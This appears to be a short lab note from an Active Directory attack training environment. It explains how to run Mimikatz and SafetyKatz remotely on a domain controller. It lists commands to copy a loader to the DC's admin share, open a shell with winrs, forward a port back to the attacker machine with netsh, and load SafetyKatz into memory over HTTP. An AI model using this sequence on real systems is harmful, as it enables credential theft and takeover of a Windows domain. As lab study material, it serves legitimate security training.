For remote Execution of Mimikatz/SafetyKatz/Rubeus in a machine.

1st. You need to have a local admin access of that machine.

I.E. We start in dcorp-std575 but we have local admin access because of user svcadmin after getting aes256 and using Rubeus. With that user we get a session in the DC machine.

Now we want to use Mimikatz in the DC machine:

2nd. Copy Loader.exe in the DC
echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-dc\c$\Users\Public\Loader.exe /Y

3rd. Port forwarding from DC to DCORP-STD575 
3.1. Start CMD in the DC machine
winrs -r:dcorp-dc cmd
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.75

This way we can load in memory SafetyKatz

4rd. Execute SafetyKatz in memory (in the path you saved the Loader -> 2nd step)
C:\Users\Public\Loader.exe -Path http://127.0.0.1/SafetyKatz.exe
